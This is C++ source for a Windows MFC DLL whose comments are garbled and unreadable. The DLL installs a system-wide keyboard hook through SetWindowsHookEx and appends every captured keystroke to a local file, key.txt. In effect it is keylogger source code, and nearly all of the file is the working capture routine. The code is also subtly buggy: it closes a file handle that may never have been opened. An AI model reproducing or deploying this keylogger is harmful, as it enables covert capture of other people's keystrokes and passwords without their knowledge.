// KeyboardHook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include <afxdllx.h>
#include <stdio.h>



#include "KeyboardHook.h"//�Զ����ͷ�ļ�


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/*********************my****************************/
//�Զ���ȫ�ֹ������ݱ���
#pragma data_seg("mydata")
	HHOOK glhHook = NULL;  //��װ����깳�Ӿ��
	HINSTANCE glhInstance = NULL;  //DLLʵ�����
#pragma data_seg()
/**************************************************/


static AFX_EXTENSION_MODULE KeyboardHookDLL = { NULL, NULL };

extern "C" int APIENTRY
DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	// Remove this if you use lpReserved
	UNREFERENCED_PARAMETER(lpReserved);

	/*********************my****************************/
	//my ���뱣��DLLʵ���ľ��
	glhInstance = hInstance;//���뱣��DLLʵ�����
	/*************************************************/
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		TRACE0("KEYBOARDHOOK.DLL Initializing!\n");
		
		// Extension DLL one-time initialization
		if (!AfxInitExtensionModule(KeyboardHookDLL, hInstance))
			return 0;

		// Insert this DLL into the resource chain
		// NOTE: If this Extension DLL is being implicitly linked to by
		//  an MFC Regular DLL (such as an ActiveX Control)
		//  instead of an MFC application, then you will want to
		//  remove this line from DllMain and put it in a separate
		//  function exported from this Extension DLL.  The Regular DLL
		//  that uses this Extension DLL should then explicitly call that
		//  function to initialize this Extension DLL.  Otherwise,
		//  the CDynLinkLibrary object will not be attached to the
		//  Regular DLL's resource chain, and serious problems will
		//  result.

		new CDynLinkLibrary(KeyboardHookDLL);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		TRACE0("KEYBOARDHOOK.DLL Terminating!\n");
		// Terminate the library before destructors are called
		AfxTermExtensionModule(KeyboardHookDLL);
	}
	return 1;   // ok

	

}
/*********************my****************************/
//���̹��Ӻ���
	LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
	{
		char ch = 0;
		FILE *fl;
		if( ((DWORD)lParam&0x40000000) && (HC_ACTION==nCode) )//�м�����
		{
			if( (wParam==VK_SPACE) || (wParam==VK_RETURN) || (wParam>=0x2f)	&& (wParam<=0x100) )
			{
				fl=fopen("key.txt","a+");//�����key.txt��
				if(wParam==VK_SPACE)
					ch=' ';
				else if(wParam==VK_RETURN)
					ch='\n';
				else
				{
					BYTE ks[256];
					GetKeyboardState(ks);
					WORD w;
					UINT scan=0;
					ToAscii(wParam,scan,ks,&w,0);
					
					//ch=MapVirtualKey(wParam,2);//���������ת�����ַ�
					ch=char(w);
					//ch=char(w);
				}//else

				printf("%c",ch);
				//cout<<ch;
				fwrite(&ch,sizeof(char),1,fl);

			}//if
			fclose(fl);
		}//if
		return CallNextHookEx(glhHook,nCode,wParam,lParam);
	}//proc

	CKeyboardHook::CKeyboardHook()
	{
	}

	CKeyboardHook::~CKeyboardHook()
	{
		if(glhHook)
			UnhookWindowsHookEx(glhHook);
	}

	//��װ���Ӳ��趨������ʾ���ھ��
	BOOL CKeyboardHook::StartHook()
	{
		BOOL bResult=FALSE;
		glhHook=SetWindowsHookEx(WH_KEYBOARD,KeyboardProc,glhInstance,NULL);
		
		if(glhHook!=NULL)
		{
			bResult=TRUE;
			//cout<<glhHook;
		}

		return bResult;
	}

	//ж��
	BOOL CKeyboardHook::StopHook()
	{
		BOOL bResult=FALSE;
		if(glhHook)
		{
			bResult=UnhookWindowsHookEx(glhHook);
			if(bResult)
				glhHook=NULL;
		}
		return bResult;
	}
	//KeyboardHook.def��SECTION����Ϊ���干�����ݶ�����
/*************************************************/